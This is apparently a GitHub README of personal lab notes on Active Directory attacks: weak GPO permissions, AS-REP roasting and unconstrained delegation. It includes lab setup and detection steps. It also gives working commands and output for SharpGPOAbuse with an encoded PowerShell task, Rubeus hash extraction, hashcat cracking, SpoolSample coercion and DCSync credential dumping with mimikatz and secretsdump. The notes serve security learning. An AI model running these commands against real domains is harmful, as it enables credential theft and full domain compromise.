# EzpzActiveDirectory

This is my personal notes on learning Active Directory. Do check out this repo too! [AniqFakhrul - Archives](https://github.com/aniqfakhrul/archives)

**_Disclaimer: Do not use this command for illegal use. Any action you take upon the information on this repo is strictly at your own risk_**

* **[Weak GPO Permission](#abusing-gpo-permissions)**
* **[Asrep-Roasting](#asrep-roasting)**
* **[Unconstrained-Delegation](#unconstrained-delegation)**

## Weak GPO Permissions

### Setup

- Go to Group Policy Management in Server Manager

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810174824.png)

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810174848.png)

- Right Click at Group Policy Objects and Click on New. Then put name as VulnerableGPO.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175057.png)

- Go to Delegation Tab and add the user/group that we want.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175204.png)

- Click on the User and click on Advanced 

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175239.png)

- Click on Advanced again

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175319.png)

- Click on the User/Group and click on Edit.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175417.png)

- Clear all permissions

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175435.png)

- Tick only here (Write all properties, Read Permissions, All Validated Writes). Then click on Apply and OK.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175554.png)

- Right click on our domain name and click on Link an Existing GPO

- Choose our vulnerable GPO and click OK

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175738.png)

- It will show up here

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810175812.png)

### Detect

- Enable Winrm on the user

```bash
# Open Settings
winrm configSDDL default
```

- Tick on Full Control on the user

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810180808.png)

- Go to Server Manager -> Active Directory Users and Computers -> Right Click on GPOUser -> Properties -> Member Of. Then add Remote Management Users.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810192748.png)

- Connect using winrs

```bash
# Commands
winrs -r:localhost -u:GPOUser -p:'Passw0rd@123!' powershell
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810180937.png)

- Import the Powerview module

```bash
# Downwload 
https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

# Commands
. .\PowerView.ps1
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810181221.png)

- Get the SID for the user we want to check

```bash
# Commands
(Get-DomainUser "GPOUser").objectsid

# Output
S-1-5-21-1107409599-3969185633-1580028286-1105
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810181533.png)

- Using powerview to find vulnerable GPO with the User SID

```bash
# Commands
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name | ?{$_.ActiveDirectoryRights.toString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner" -and $_.SecurityIdentifier -match "S-1-5-21-1107409599-3969185633-1580028286-1105"}}

# Output
AceType               : AccessAllowed
ObjectDN              : CN={2A7B783B-BD16-4EF2-9B53-59F0F0B76070},CN=Policies,CN=System,DC=bank,DC=local
ActiveDirectoryRights : GenericWrite
OpaqueLength          : 0
ObjectSID             :
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-1107409599-3969185633-1580028286-1105
AccessMask            : 131112
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810181753.png)

- Take the CN value from the ObjectDN and use it in the commands below to find the name of the vulnerable GPO.

```bash
# Commands
Get-NetGPO "{2A7B783B-BD16-4EF2-9B53-59F0F0B76070}"

# Output
usncreated              : 16770
displayname             : VulnerableGPO
whenchanged             : 8/10/2021 9:56:31 AM
objectclass             : {top, container, groupPolicyContainer}
gpcfunctionalityversion : 2
showinadvancedviewonly  : True
usnchanged              : 16778
dscorepropagationdata   : {8/10/2021 9:56:31 AM, 8/10/2021 9:52:17 AM, 1/1/1601 12:00:00 AM}
name                    : {2A7B783B-BD16-4EF2-9B53-59F0F0B76070}
flags                   : 0
cn                      : {2A7B783B-BD16-4EF2-9B53-59F0F0B76070}
gpcfilesyspath          : \\bank.local\SysVol\bank.local\Policies\{2A7B783B-BD16-4EF2-9B53-59F0F0B76070}
distinguishedname       : CN={2A7B783B-BD16-4EF2-9B53-59F0F0B76070},CN=Policies,CN=System,DC=bank,DC=local
whencreated             : 8/10/2021 9:51:01 AM
versionnumber           : 0
instancetype            : 4
objectguid              : 74a46cc3-42fb-43a1-af25-6105a389268c
objectcategory          : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=bank,DC=local
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810181916.png)

- From the output above we found out that the name of GPO is **VulnerableGPO**

### Attack

**1. PowerGPOAbuse.ps1**

```bash
# Download
https://github.com/rootSySdk/PowerGPOAbuse

# Commands
. .\PowerGPOAbuse.ps1
Add-GPOGroupMember -Member 'GPOUser' -GPOIdentity 'VulnerableGPO' -Force
gpupdate /force

# Notes
- Make sure to run gpupdate /force everytime you make add changes.
```

**2. SharpGPOAbuse.exe**

```bash
# Download
https://github.com/FSecureLABS/SharpGPOAbuse
https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/SharpGPOAbuse.exe

# Commands
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount GPOUser --GPOName "VulnerableGPO" --force
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author BANK\Administrator --Command "cmd.exe" --Arguments "/c powershell.exe -ExecutionPolicy Bypass -Enc JgAgAEMAOgBcAHcAaQBuAGQAbwB3AHMAXAB0AGEAcwBrAHMAXAB0AG8AbwBsAHMAXABDAG8AbgB0AGUAbgB0AC4AcABzADEA" --GPOName "VulnerableGPO" --force
gpupdate /force
 
# Notes
- Make sure to run gpupdate /force everytime you make changes.
```

### References

```bash
1. https://herrscher.info/index.php/2021/04/11/red-teaming-guide/
2. https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#abusing-weak-gpo-permissions
3. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#exploit-group-policy-objects-gpo
4. https://labs.f-secure.com/tools/sharpgpoabuse/
5. https://4sysops.com/archives/run-powershell-scripts-as-immediate-scheduled-tasks-with-group-policy/
6. https://github.com/aniqfakhrul/archives
```

## Asrep-Roasting

### Setup

- Create a user (AsrepRoastUser). Go to Server Manager -> Tools -> Active Directory Users and Computers. Right click on Users and click New -> User. Fill in all the details.

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810214403.png)

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810214539.png)

- Right click on the new User and click properties. Go to Account tab and tick on **Do not require Kerberos preauthentication**. 

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810215016.png)

- Also take notes to tick on **"Password Never Expires"** and untick on **"User must Change password at next logon"**

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810222737.png)

### Attack On Windows

- Using **PowerView.ps1** we can enumerate users that have **Preauth** enabled.

```bash
# Download 
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1

# Commands (Powerview)
Get-DomainUser -PreauthNotRequired -Properties distinguishedname

# Output
distinguishedname
-----------------
CN=AsrepRoast User,CN=Users,DC=bank,DC=local

# Commands (adsisearcher)
([adsisearcher]"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))").FindAll()

# Output
Path                                                Properties
----                                                ----------
LDAP://CN=AsrepRoast User,CN=Users,DC=bank,DC=local {givenname, codepage, objectcategory, dscorepropagationdata...}
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810221142.png)

- Then use these tools to get the hash

```bash
# Download (Rubeus)
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe

# Commands (Rubeus)
.\Rubeus.exe asreproast /format:hashcat /nowrap
 
# Output (Rubeus)

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


[*] Action: AS-REP roasting

[*] Target Domain          : bank.local

[*] Searching path 'LDAP://DC01.bank.local/DC=bank,DC=local' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : AsrepRoastUser
[*] DistinguishedName      : CN=AsrepRoast User,CN=Users,DC=bank,DC=local
[*] Using domain controller: DC01.bank.local (fe80::69e4:c7b6:29d1:847f%5)
[*] Building AS-REQ (w/o preauth) for: 'bank.local\AsrepRoastUser'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$23$AsrepRoastUser@bank.local:224332F49C1EB8E5B0B98CF7A8DFA308$1EE690FF09E4E5AC4B0E013F52FA3006A468F809401B698E294CB937B38F1C1CAAC44BE5C825A31139D709E12F32C0B715467132D4519D0BF6633FECB8C227000AF57E76145473D8DA58A855771FFFCF986F4938CE8F255AA00CC85347CB0B67DDF0E32CB180D18639F6E59320C598B2A60118894C0ECB3A60913129A79B63EAF87B0EFA86C53D1ADDCC966EE3D2C71F11BAF8F0DEB07F0B094FB04AA84D8F9CCB247F6229BF10B88B20520A32454281D6E9C5402F2D89E1C0CE12110AACB8769E07DFC128D1BD21E86141ED306BAB2AD868ABA237E167A2A7E924A3DF5BC2CD0735BA85E88234FE

# Download (ASREPRoast)
https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1

# Commands (ASREPRoast)
Get-ASREPHash -Username AsrepRoastUser

# Output
$krb5asrep$AsrepRoastUser@bank.local:64aec4f448950fcc28b74073a2b21b80$333efa323aa6a76925a38d0ccc2a20e5f84de6fa96901a0ac83e9dced1c69fe07273f02f998c7b661770b61f6cae941fc58bc28a9df0c1443a7add3d61532963214ba5f34d9a03a89ba9612ada74451c071c4b0e82654a117ad466423937d941618050cc53ce25a07a47918684adc37c2b4d15c6aa4c1079e8cf23cd594e70fd0bde7cd249c298933794d2b09b80937179f214a2041d7fbea181da47c5eaa45ac6c92d49d0587d5486d4a3fc3203c65f0a038dbae6afa7b6a232a1984ab277580f183f037a4483fbe269cf7bd84b573be9effddb4bc575020094936c933b51f008ef451e6185e9f6
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810223314.png)

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810223253.png)

- If we do not have Admin privileges , we might have difficulty to run PowerView to enumerate. This is because we cannot view the useraccount control attributes as low privilege user. The solution we can try bruteforce it using **adsisearcher** and **Get-ASREPHash**

```
# Commands
([adsisearcher]"(&(samAccountType=805306368))").FindAll().Properties.samaccountname | %{Get-ASREPHash -UserName $_ -ErrorAction SilentlyContinue}
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810232137.png)


### Attack On Linux

- Use impacket tools (GetNPUsers.py)

```
# Download
https://github.com/SecureAuthCorp/impacket

# Commands
GetNPUsers.py -dc-ip 10.10.10.10 -request 'bank.local/AsrepRoastUser' -no-pass
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810223812.png)

### Cracking

- Crack with hashcat using this command

```bash
# Mode
18200

# Commands
.\hashcat.exe -m 18200 .\hash.txt .\pass.txt
```

![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810224911.png)

### References

```bash
1. http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/
2. https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast
3. https://herrscher.info/index.php/2021/04/11/red-teaming-guide/
4. https://github.com/aniqfakhrul/archives#asrep-roasting
```

## Unconstrained-Delegation

### Setup

1. Create a Domain Join Computer and go to Server Manager -> Tools -> Active Directory Users and Computers. Click on Computer -> Right Click on the Domain join Computer -> Click on Properties.

![[Pasted image 20210811222825.png]]

2. Go to Delegation tab and tick on **"Trust this computer for delegation to any service (Kerberos)"** and click Apply.

![[Pasted image 20210811222909.png]]

### Detect

**1. PowerView.ps1**

```bash
# Commands (PowerView)
. .\PowerView.ps1
Get-DomainComputer -Unconstrained -Properties dnshostname

# Output (PowerView)
dnshostname
-----------
DC01.bank.local
VULN01.bank.local

# Commands (adsisearcher)
 ([adsisearcher]"(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))").FindAll()
 
# Output (adsisearcher)
Path                                                  Properties
----                                                  ----------
LDAP://CN=DC01,OU=Domain Controllers,DC=bank,DC=local {ridsetreferences, logoncount, codepage, objectcategory...}
LDAP://CN=VULN01,CN=Computers,DC=bank,DC=local        {logoncount, codepage, objectcategory, iscriticalsystemobject...}
```

![[Pasted image 20210811224149.png]]

2. Check if a spool service is running on a remote host

```bash
ls \\dc01\pipe\spoolss
```

![[Pasted image 20210811225305.png]]

### Attack

**1. Printer Bug**

- Download **Rebues.exe**

```bash
# Download Rubeus
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
```

- Run this command in Rubeus **(with Elevated Privilege)**

```bash
# Command
.\Rubeus.exe monitor /interval:5 /nowrap
```

- While running Rubeus, we can run **SpoolSample.exe**

```bash
# Download & Compiled
https://github.com/leechristensen/SpoolSample.git

# Command
.\SpoolSample.exe DC01.bank.local VULN01.bank.local
```

![[Pasted image 20210811231133.png]]

![[Pasted image 20210811231146.png]]

**2. Using secretdumps to perform dcsync**

- Open mimikatz then run 

```bash
sekurlsa::tickets /export
```

![[Pasted image 20210811232703.png]]

- We can see that there is DC **(kirbi file)**

![[Pasted image 20210811232724.png]]

- Download **kekeo** and use this command. We will convert the kirbi file to a ccache file.

```bash
# Download
https://github.com/gentilkiwi/kekeo

# Command
misc::convert ccache dc01.kirbi
```

![[Pasted image 20210811233303.png]]

- Transfer the ccache file to attacker machine. Then use this commands to export the ccache file.

```bash
# Command
export KRB5CCNAME=dc01.ccaches
```

- Use secretsdump to perform dcsync.

```bash
secretsdump.py -k DC01.bank.local -just-dc
```

![[Pasted image 20210811235053.png]]

- Take notes to add **"DC01.bank.local"** and **"bank.local"** in /etc/hosts

![[Pasted image 20210811235232.png]]

**3. Using mimikatz to perform dcsync**

- Open mimikatz and run this

```bash
# Commands
lsadump::dcsync /domain:bank.local /all /csv
lsadump::dcsync /domain:bank.local /user:DC01$
```

![[Pasted image 20210811235404.png]]

### References

```bash
1. https://github.com/aniqfakhrul/archives#unconstrained-delegation
2. https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1
3. http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/
4. https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation
5. https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/
```